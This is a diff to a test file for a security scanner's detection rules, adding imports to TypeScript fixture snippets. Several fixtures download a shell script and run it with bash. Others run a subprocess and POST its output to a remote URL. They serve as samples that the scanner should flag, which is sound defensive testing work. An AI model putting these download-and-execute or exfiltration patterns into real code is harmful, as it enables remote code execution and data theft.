@@ -131,7 +131,7 @@ describe("rule boundaries", () => {
     const findings = downloadWriteExecRule.evaluate([
       createScanFile(
         "src/download.ts",
-        'export async function install() { const response = await fetch("https://example.com/tool.sh"); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa("bash /tmp/tool.sh"); }'
+        'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function install() { const response = await fetch("https://example.com/tool.sh"); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa("bash", ["/tmp/tool.sh"]); }'
       )
     ]);
 
@@ -145,7 +145,7 @@ describe("rule boundaries", () => {
     const findings = downloadWriteExecRule.evaluate([
       createScanFile(
         "src/download.ts",
-        'export async function install(input: { url: string; command: string }) { const response = await fetch(input.url); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa(input.command); }'
+        'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function install(input: { url: string; command: string }) { const response = await fetch(input.url); await writeFile("/tmp/tool.sh", await response.text(), "utf8"); return execa(input.command, ["/tmp/tool.sh"]); }'
       )
     ]);
 
@@ -158,7 +158,7 @@ describe("rule boundaries", () => {
     const findings = downloadWriteExecRule.evaluate([
       createScanFile(
         "src/download.ts",
-        'export async function cache() { const response = await fetch("https://example.com/tool.sh"); return writeFile("/tmp/tool.sh", await response.text(), "utf8"); }'
+        'import { writeFile } from "node:fs/promises"; export async function cache() { const response = await fetch("https://example.com/tool.sh"); return writeFile("/tmp/tool.sh", await response.text(), "utf8"); }'
       )
     ]);
 
@@ -281,7 +281,7 @@ describe("rule boundaries", () => {
     const findings = subprocessNetworkExfilRule.evaluate([
       createScanFile(
         "src/exfil.ts",
-        'export async function ship() { const result = await execa("git status"); return fetch("https://example.com/upload", { method: "POST", body: result.stdout }); }'
+        'import { execa } from "execa"; export async function ship() { const result = await execa("git status"); return fetch("https://example.com/upload", { method: "POST", body: result.stdout }); }'
       )
     ]);
 
@@ -295,7 +295,7 @@ describe("rule boundaries", () => {
     const findings = subprocessNetworkExfilRule.evaluate([
       createScanFile(
         "src/exfil.ts",
-        'export async function ship(input: { command: string; url: string }) { const result = await execa(input.command); return fetch(input.url, { method: "POST", body: result.stdout }); }'
+        'import { execa } from "execa"; export async function ship(input: { command: string; url: string }) { const result = await execa(input.command); return fetch(input.url, { method: "POST", body: result.stdout }); }'
       )
     ]);
 
